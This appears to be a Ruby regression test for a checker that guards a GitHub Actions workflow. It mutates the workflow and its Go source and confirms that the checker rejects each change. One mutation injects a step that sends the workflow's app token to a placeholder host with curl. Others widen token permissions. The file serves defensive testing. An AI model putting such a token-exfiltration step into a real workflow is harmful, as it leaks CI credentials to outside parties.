#!/usr/bin/env ruby

require "open3"
require "tempfile"

ROOT = File.expand_path("../..", __dir__)
CHECKER = File.join(ROOT, ".github/scripts/check-actions-watcher-routing.rb")
WORKFLOW = File.join(ROOT, ".github/workflows/actions-watcher.yml")
SOURCE = File.join(ROOT, "cmd/actions-watcher/github.go")

def run_checker(workflow, source)
  Tempfile.create(["actions-watcher", ".yml"]) do |workflow_file|
    Tempfile.create(["actions-watcher", ".go"]) do |source_file|
      workflow_file.write(workflow)
      workflow_file.flush
      source_file.write(source)
      source_file.flush
      stdout, stderr, status = Open3.capture3(
        {
          "ACTIONS_WATCHER_WORKFLOW_PATH" => workflow_file.path,
          "ACTIONS_WATCHER_SOURCE_PATH" => source_file.path
        },
        "ruby", CHECKER,
        chdir: ROOT
      )
      [stdout, stderr, status]
    end
  end
end

workflow = File.read(WORKFLOW)
source = File.read(SOURCE)
stdout, stderr, status = run_checker(workflow, source)
abort "baseline workflow failed: #{stdout}#{stderr}" unless status.success?

mutations = {
  "workflow allowlist" => [workflow.sub("  - Go vulnerability monitoring\n", ""), source],
  "cancellation policy" => [workflow.sub("cancel-in-progress: false", "cancel-in-progress: true"), source],
  "checkout ref" => [workflow.sub("ref: main", 'ref: "${{ github.ref }}"'), source],
  "token permission" => [workflow.sub("permission-issues: write", "permission-issues: read"), source],
  "extra token permission" => [workflow.sub("permission-metadata: read", "permission-metadata: read\n          permission-contents: write"), source],
  "extra token-consuming step" => [workflow.sub(
    "      - name: Derive watcher activation time",
    "      - name: Extra token consumer\n        env:\n          TOKEN: ${{ steps.app-token.outputs.token }}\n        run: curl -d \\\"$TOKEN\\\" https://example.invalid\n\n      - name: Derive watcher activation time"
  ), source],
  "duplicate token step" => [workflow.sub(
    "      - name: Derive watcher activation time",
    "      - name: Extra token\n        uses: actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510\n        with:\n          permission-contents: write\n\n      - name: Derive watcher activation time"
  ), source],
  "failure conclusion policy" => [workflow, source.sub('conclusion == "timed_out"', 'conclusion == "cancelled"')],
  "triggering run readback" => [workflow, source.sub("GetWorkflowRunByID", "GetWorkflowRun")]
}

mutations.each do |name, (mutated_workflow, mutated_source)|
  _, error_output, result = run_checker(mutated_workflow, mutated_source)
  abort "checker accepted changed #{name}" if result.success?
  abort "checker did not identify changed #{name}" unless error_output.include?("FAIL:")
end

puts "actions watcher routing checker tests passed"
